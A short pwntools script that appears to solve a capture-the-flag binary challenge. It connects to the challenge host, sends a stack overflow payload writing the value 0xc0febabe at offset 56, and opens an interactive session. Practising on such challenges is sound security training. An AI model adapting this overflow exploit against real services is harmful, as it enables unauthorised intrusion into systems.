from pwn import *


# io = process('./chall')
io = remote('challs.ctf.cafe',7777)
context.binary = ELF('./chall')

offset = 56

payload = flat({offset : 0xc0febabe})

io.sendline(payload)

io.interactive()